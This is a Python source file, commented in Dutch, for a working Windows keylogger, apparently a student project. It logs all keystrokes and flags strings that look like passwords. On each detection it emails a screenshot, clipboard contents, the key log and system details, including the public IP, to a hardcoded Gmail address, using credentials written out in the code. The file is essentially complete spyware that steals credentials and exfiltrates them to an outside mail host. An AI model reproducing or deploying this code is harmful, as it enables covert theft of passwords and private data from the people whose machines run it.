# Modules
import re
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
from pathlib import Path

# Variabelen keylogger

key_log = "key_log.txt"
path_directory = Path(__file__)
path_keylog = str(path_directory).replace("main.py", "key_log.txt")
path_keylog_formatted = re.escape(str(path_keylog))

count = 0
keys = []
currentstring = []
previousstring = []

#Variabelen voor password detection


# Variabelen voor mail
email_address = "keylogcasus3@gmail.com"
password = "ryxbaohfeyywyypq"
toaddrs = "keylogcasus3@gmail.com"

# Variabelen voor systeeminformatie
sytem_info = "systeminfo.txt"
path_system = str(path_directory).replace("main.py", "systeminfo.txt")
path_system_formatted = re.escape(str(path_system))

# Variabelen voor clipboard content
clipboard_info = "clipboard.txt"
path_clipboard = str(path_directory).replace("main.py", "clipboard.txt")

# Variabelen voor screenshots
screenshot_info = "screenshot.png"
path_screenshot = str(path_directory).replace("main.py", "screenshot.png")

# Variabelen voor timer
iterations = 0
time = time.time()
#stop_time = time.time() + time_iteration

#Functies voor screenshot

def screenshot():
    img = ImageGrab.grab()
    img.save(path_screenshot)

# Functies mail
def send_email(filename, attachment, toaddrs):
    fromaddrs = email_address
    message = MIMEMultipart()
    message['From'] = fromaddrs
    message['To'] = toaddrs
    message['Subject'] = "Log File"
    body = "Body_of_the_mail"

    message.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    message.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddrs, password)

    text = message.as_string()
    s.sendmail(fromaddrs, toaddrs, text)
    s.quit()

def Send_data():
        screenshot()
        copyclipboard()
        system_info()
        send_email(screenshot_info, path_screenshot, toaddrs)
        send_email(key_log, path_keylog, toaddrs)
        send_email(sytem_info, path_system, toaddrs)
        send_email(clipboard_info, path_clipboard, toaddrs)

# Functies keylogger

def on_press(key):
    global count, keys, currentstring, previousstring
    if key == Key.space or key == Key.enter:
        string = ""
        for i in currentstring:
            if str(i) != "'" and len(str(i)) <= 3:
                string += str(i)
        print(CheckPass(string))
        currentstring.clear()
    previousstring.append(key)
    currentstring.append(key)
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_log(keys)
        keys = []


def on_release(key):
    global currentstring, previousstring
    if key == Key.esc:
        return False



def write_log(keys):
    with open(path_keylog, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

# Code voor clipboard functie
def copyclipboard():
    with open(path_clipboard, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard data: " +  pasted_data)
        except:
            f.write("Clipboard could not be copied")

# Functies systeeminfo

def system_info():
    with open(path_system, "a") as f:
        hostname = socket.gethostname()
        IP = socket.gethostbyname(hostname)
        try:
            public_IP = get("https://api.apify.org").text
            f.write("Public IP: " + public_IP)
        except Exception:
            f.write("Kon public IP adres niet ophalen.")
        f.write("CPU Info: " + (platform.processor()) + "\n")
        f.write("OS info: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine info: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP: " + IP + "\n")


# code voor password detection

def CheckPass(previousstring):
    l, u, p, d = 0, 0, 0, 0
    capitalalphabets="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    smallalphabets="abcdefghijklmnopqrstuvwxyz"
    specialchar="$@_!#?*&^%'"
    digits="0123456789"
    if (len(previousstring) >= 8):
        for i in previousstring:
            # counting lowercase alphabets
            if (i in smallalphabets):
                l+=1
            # counting uppercase alphabets
            if (i in capitalalphabets):
                u+=1
            # counting digits
            if (i in digits):
                d+=1
            # counting the mentioned special characters
            if(i in specialchar):
                p+=1
    if (l>=1 and u>=1 and p>=1 and d>=1 and l+p+u+d==len(previousstring)):
        print("Password detected")
        Send_data()
        print("mail sent")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()















